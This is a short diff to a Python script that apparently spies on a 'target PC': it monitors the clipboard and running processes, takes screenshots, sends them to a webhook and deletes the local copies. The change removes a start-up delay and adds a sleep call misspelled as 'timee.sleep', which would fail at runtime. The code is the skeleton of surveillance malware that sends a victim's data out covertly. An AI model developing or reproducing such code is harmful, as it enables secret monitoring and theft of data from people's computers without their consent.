@@ -162,17 +162,11 @@ def monitor_clipboard():
 
 def monitor_processes():
     running_processes = set()
-    first_check = True  # Flag to handle the first delay
 
     while True:
         current_processes = set(p.name() for p in psutil.process_iter())
         new_processes = current_processes - running_processes
         closed_processes = running_processes - current_processes
-
-        # If it's the first check, wait for 15 seconds
-        if first_check:
-            time.sleep(10)  # Initial delay of 15 seconds
-            first_check = False  # Disable the first check flag
 
         for proc in new_processes:
             message = f"Started: {proc}"
@@ -214,6 +208,7 @@ def screenshot():
         print(f"Screenshot saved as {filename}")  # Debug print
 
         send_to_webhook_pic(filename)
+        timee.sleep(1)
         os.remove(filename)
         print(f"Deleted {filename}")
         send_to_webhook_pic(f"Deleted {filename} on target PC")
